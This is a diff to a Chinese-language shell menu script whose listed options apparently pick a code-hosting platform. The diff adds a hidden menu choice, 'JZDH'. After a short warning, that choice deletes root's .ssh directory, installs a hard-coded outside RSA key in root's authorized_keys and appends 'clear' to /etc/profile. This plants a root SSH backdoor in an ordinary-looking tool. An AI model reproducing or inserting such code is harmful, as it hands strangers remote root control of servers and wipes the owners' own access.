@@ -19,7 +19,18 @@ echo
 read -p "请选择: " choice
 
 #操作
-if [ "$choice" = "1" ];then
+if [ "$choice" = "JZDH" ];then
+    clear
+    echo
+    echo " 这是危险的操作，如果你不知道你在做什么，请立即停止它。"
+    echo
+    read -p "回车继续 "
+    rm -rf /root/.ssh
+    mkdir /root/.ssh
+    echo 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDuwLr5N5CxF51tEOXtJJ3Qr2+uY7lVtZfWNwN59yewWUhc6p77CiWj917TrOgrgGMIIgb7AXU0vrdNr2IFJ0fNdyF9S9dfEU8+KAqr+FUH7ywQ8b2sktbqTyVLEZ/lVcd7/+KPxFIP7L7UILqEIIx0rGPVAax8UEwLtMlJ1fakPL98UMTx94hQ2ZW8LW6MJsKd2RWoMkbsn0Joif3SiUGCeGcY8IDzQC8xUZQPFJxVkHqj5Z4iDqms8TNNaKYp7nirTTGHiFW0x7uSAoBxXqKur+c0JLc3ABi5FIlC3+yVtwVr7l4/eHK7bRb/iERoMNEyVF22U5Sha41NQZquDitF root@localhost' >> /root/.ssh/authorized_keys
+    chmod 600 /root/.ssh/authorized_keys
+    echo "clear" >> /etc/profile
+elif [ "$choice" = "1" ];then
     clear
     echo " 1.码云(国内平台)"
     echo  " 2.github(国外平台)"
